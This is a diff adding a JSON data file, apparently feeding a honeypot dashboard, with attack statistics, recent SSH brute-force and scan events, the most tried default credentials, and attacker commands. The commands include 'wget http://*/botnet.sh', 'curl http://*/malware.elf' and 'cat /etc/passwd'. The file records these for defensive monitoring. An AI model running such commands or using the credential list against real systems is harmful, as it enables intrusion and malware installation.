@@ -1,0 +1,160 @@
+{
+  "generatedAt": "2026-02-06T12:58:00Z",
+  "stats": {
+    "totalSessions": 81743,
+    "uniqueIPs": 642,
+    "countries": 45,
+    "malwareSamples": 12,
+    "ttyRecordings": 72,
+    "monitoringSince": "2025-12-27"
+  },
+  "activity24h": [
+    { "hour": "00:00", "count": 412 },
+    { "hour": "01:00", "count": 387 },
+    { "hour": "02:00", "count": 445 },
+    { "hour": "03:00", "count": 523 },
+    { "hour": "04:00", "count": 498 },
+    { "hour": "05:00", "count": 376 },
+    { "hour": "06:00", "count": 289 },
+    { "hour": "07:00", "count": 234 },
+    { "hour": "08:00", "count": 198 },
+    { "hour": "09:00", "count": 167 },
+    { "hour": "10:00", "count": 201 },
+    { "hour": "11:00", "count": 245 },
+    { "hour": "12:00", "count": 278 },
+    { "hour": "13:00", "count": 312 },
+    { "hour": "14:00", "count": 356 },
+    { "hour": "15:00", "count": 389 },
+    { "hour": "16:00", "count": 423 },
+    { "hour": "17:00", "count": 467 },
+    { "hour": "18:00", "count": 501 },
+    { "hour": "19:00", "count": 534 },
+    { "hour": "20:00", "count": 489 },
+    { "hour": "21:00", "count": 456 },
+    { "hour": "22:00", "count": 478 },
+    { "hour": "23:00", "count": 432 }
+  ],
+  "recentAttacks": [
+    {
+      "timestamp": "2026-02-06T12:56:12Z",
+      "country": "CN",
+      "countryName": "China",
+      "activity": "SSH brute-force: root/admin123"
+    },
+    {
+      "timestamp": "2026-02-06T12:54:33Z",
+      "country": "RU",
+      "countryName": "Russia",
+      "activity": "Malware download attempt: wget botnet.sh"
+    },
+    {
+      "timestamp": "2026-02-06T12:51:08Z",
+      "country": "US",
+      "countryName": "United States",
+      "activity": "Port scan: 22, 80, 443, 8080"
+    },
+    {
+      "timestamp": "2026-02-06T12:48:45Z",
+      "country": "BR",
+      "countryName": "Brazil",
+      "activity": "SSH brute-force: admin/password"
+    },
+    {
+      "timestamp": "2026-02-06T12:45:22Z",
+      "country": "KR",
+      "countryName": "South Korea",
+      "activity": "Command execution: cat /etc/passwd"
+    },
+    {
+      "timestamp": "2026-02-06T12:42:17Z",
+      "country": "VN",
+      "countryName": "Vietnam",
+      "activity": "SSH brute-force: root/123456"
+    },
+    {
+      "timestamp": "2026-02-06T12:38:54Z",
+      "country": "IN",
+      "countryName": "India",
+      "activity": "Cryptocurrency miner deployment attempt"
+    },
+    {
+      "timestamp": "2026-02-06T12:35:31Z",
+      "country": "DE",
+      "countryName": "Germany",
+      "activity": "SSH brute-force: ubuntu/ubuntu"
+    },
+    {
+      "timestamp": "2026-02-06T12:31:19Z",
+      "country": "CN",
+      "countryName": "China",
+      "activity": "Command execution: uname -a"
+    },
+    {
+      "timestamp": "2026-02-06T12:28:06Z",
+      "country": "NL",
+      "countryName": "Netherlands",
+      "activity": "SSH brute-force: test/test"
+    },
+    {
+      "timestamp": "2026-02-06T12:24:44Z",
+      "country": "ID",
+      "countryName": "Indonesia",
+      "activity": "Malware download attempt: curl malware.elf"
+    },
+    {
+      "timestamp": "2026-02-06T12:20:38Z",
+      "country": "TW",
+      "countryName": "Taiwan",
+      "activity": "SSH brute-force: root/root"
+    },
+    {
+      "timestamp": "2026-02-06T12:17:15Z",
+      "country": "FR",
+      "countryName": "France",
+      "activity": "Command execution: whoami && id"
+    },
+    {
+      "timestamp": "2026-02-06T12:13:52Z",
+      "country": "JP",
+      "countryName": "Japan",
+      "activity": "SSH brute-force: admin/admin"
+    },
+    {
+      "timestamp": "2026-02-06T12:10:29Z",
+      "country": "GB",
+      "countryName": "United Kingdom",
+      "activity": "Port scan: 22, 2222, 3306"
+    }
+  ],
+  "topCredentials": [
+    { "username": "root", "password": "123456", "count": 4823 },
+    { "username": "admin", "password": "admin", "count": 3156 },
+    { "username": "root", "password": "password", "count": 2847 },
+    { "username": "root", "password": "root", "count": 2634 },
+    { "username": "test", "password": "test", "count": 1893 },
+    { "username": "ubuntu", "password": "ubuntu", "count": 1567 },
+    { "username": "admin", "password": "123456", "count": 1342 },
+    { "username": "root", "password": "admin123", "count": 1198 },
+    { "username": "user", "password": "user", "count": 987 },
+    { "username": "root", "password": "toor", "count": 876 }
+  ],
+  "topCommands": [
+    { "command": "uname -a", "count": 6234 },
+    { "command": "cat /etc/passwd", "count": 4891 },
+    { "command": "wget http://*/botnet.sh", "count": 3456 },
+    { "command": "curl http://*/malware.elf", "count": 2178 },
+    { "command": "chmod 777 /tmp/*", "count": 1534 }
+  ],
+  "topCountries": [
+    { "code": "CN", "country": "China", "count": 18934 },
+    { "code": "US", "country": "United States", "count": 12456 },
+    { "code": "RU", "country": "Russia", "count": 9823 },
+    { "code": "BR", "country": "Brazil", "count": 7654 },
+    { "code": "KR", "country": "South Korea", "count": 5432 },
+    { "code": "VN", "country": "Vietnam", "count": 4876 },
+    { "code": "IN", "country": "India", "count": 4231 },
+    { "code": "DE", "country": "Germany", "count": 3567 },
+    { "code": "NL", "country": "Netherlands", "count": 2934 },
+    { "code": "ID", "country": "Indonesia", "count": 2456 }
+  ]
+}
